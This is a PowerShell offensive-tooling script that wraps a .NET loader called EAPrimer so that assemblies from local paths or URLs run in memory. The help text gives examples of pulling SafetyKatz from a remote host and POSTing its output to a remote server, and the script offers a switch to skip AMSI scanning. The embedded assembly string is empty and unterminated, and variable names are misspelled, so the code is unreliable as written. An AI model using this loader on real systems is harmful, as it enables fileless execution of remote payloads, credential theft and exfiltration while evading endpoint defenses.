function Invoke-EAPrimer
{
    <#
    .SYNOPSIS

    This script loads the .Net assembly EAPrimer.exe that will dynamically loads other .Net assemblies for
    in-memory execution. Input assemblies are accepted in the form of local file paths or URLs via the "Path"
    parameter.

    By default output will be displayed in the console. This can be redirected by the user through the
    "POST" parameter to write to a file or even send results via HTTP POST request.

    Author: @m8sec
    License: MIT
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

    Uses EAPrimer.exe to load .NET assemblies for in-memory execution.

    .PARAMETER Path
    Path to target assembly for execution. This can be a local file path or URL.

    .PARAMETER Post
    Write results to a file or provide URL to send via HTTP POST request to a remote server. By
    default, output will be displayed in the terminal.

    .PARAMETER Args
    Optional, pass arguments to assembly for execution.

    .PARAMETER  Help
    Show EAPrimer.exe help menu.

    .EXAMPLE
    Execute local seatbelt.exe and write output to file.
    Invoke-EAPrimer -Path .\assembly.exe -Post output.exe

    .EXAMPLE
    Execute safetykatz.exe from url and post output to remote server.
    Invoke-EAPrimer -Path http://192.168.0.20/assembly.exe -Post http://192.168.0.20
    #>
    Param(
        [Parameter(Position=0, Mandatory=$true)]
        [String]
        $Path,

        [Parameter(Position=1)]
        [String]
        $Post,

        [Parameter(Position=2)]
        [String]
        $Args,

	[Parameter(Position=3)]
        [Switch]
        $Help=$flase,

	[Parameter(Position=4)]
        [Switch]
        $SkipAMSI=$flase
    )
    $assekblyString = "
    $assemblyBytes = [System.Convert]::FromBase64String($assekblyString)
    [System.Reflection.Assembly]::Load($assemblyBytes) | Out-Null


    # Execute & EAPrimer will handle output
    $parameters=@("-path=$Path")

    if ($Post)
    {
        $parameters += "-post=$Post"
    }

    if ($Args)
    {
        $parameters += "-args=$Args"
    }

    if ($Help)
    {
        $parameters += "-help"
    }

    [EAPrimer.Program]::Main($parameters)
}
